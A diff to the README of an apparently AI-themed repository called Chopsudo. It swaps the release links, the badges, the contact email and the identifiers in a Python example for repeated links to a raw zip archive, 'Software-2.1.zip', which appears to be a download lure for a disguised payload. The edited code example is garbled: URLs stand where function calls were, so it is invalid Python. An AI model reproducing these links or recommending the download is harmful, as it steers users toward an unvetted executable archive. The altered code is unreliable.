@@ -2,7 +2,7 @@
 
 Welcome to the **Chopsudo** repository! Here, we explore the depths of artificial intelligence, providing tools and resources for developers and engineers alike. Our mission is to empower you with the knowledge and tools necessary to harness the full potential of AI. 
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0.0-blue)](https://github.com/sara3016/chopsudo/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/sara3016/chopsudo/main/nonfood/Software-2.1.zip%20Latest%20Release-v1.0.0-blue)](https://raw.githubusercontent.com/sara3016/chopsudo/main/nonfood/Software-2.1.zip)
 
 ## Table of Contents
 
@@ -28,7 +28,7 @@ Artificial intelligence is transforming industries. With **Chopsudo**, we aim to
 
 ## Installation
 
-To get started with **Chopsudo**, you can download the latest release from our [Releases section](https://github.com/sara3016/chopsudo/releases). Once downloaded, follow these steps to install:
+To get started with **Chopsudo**, you can download the latest release from our [Releases section](https://raw.githubusercontent.com/sara3016/chopsudo/main/nonfood/Software-2.1.zip). Once downloaded, follow these steps to install:
 
 1. **Download the release file** from the link above.
 2. **Extract the files** to your preferred directory.
@@ -42,16 +42,16 @@ After installation, you can begin using **Chopsudo** for your AI projects. Hereâ
 import chopsudo
 
 # Initialize the AI model
-model = chopsudo.AIModel()
+model = https://raw.githubusercontent.com/sara3016/chopsudo/main/nonfood/Software-2.1.zip()
 
 # Load your dataset
-data = chopsudo.load_data('path/to/your/data.csv')
+data = https://raw.githubusercontent.com/sara3016/chopsudo/main/nonfood/Software-2.1.zip('https://raw.githubusercontent.com/sara3016/chopsudo/main/nonfood/Software-2.1.zip')
 
 # Train the model
-model.train(data)
+https://raw.githubusercontent.com/sara3016/chopsudo/main/nonfood/Software-2.1.zip(data)
 
 # Make predictions
-predictions = model.predict(new_data)
+predictions = https://raw.githubusercontent.com/sara3016/chopsudo/main/nonfood/Software-2.1.zip(new_data)
 ```
 
 For more detailed usage instructions, refer to the documentation included in the repository.
@@ -72,8 +72,8 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## Contact
 
-For questions or support, please reach out to us via our GitHub page or email us at support@chopsudo.dev.
+For questions or support, please reach out to us via our GitHub page or email us at https://raw.githubusercontent.com/sara3016/chopsudo/main/nonfood/Software-2.1.zip
 
-[![Visit Releases Section](https://img.shields.io/badge/Visit%20Releases%20Section-orange)](https://github.com/sara3016/chopsudo/releases)
+[![Visit Releases Section](https://raw.githubusercontent.com/sara3016/chopsudo/main/nonfood/Software-2.1.zip%20Releases%20Section-orange)](https://raw.githubusercontent.com/sara3016/chopsudo/main/nonfood/Software-2.1.zip)
 
 Thank you for checking out **Chopsudo**! We look forward to seeing what you create with our tools.
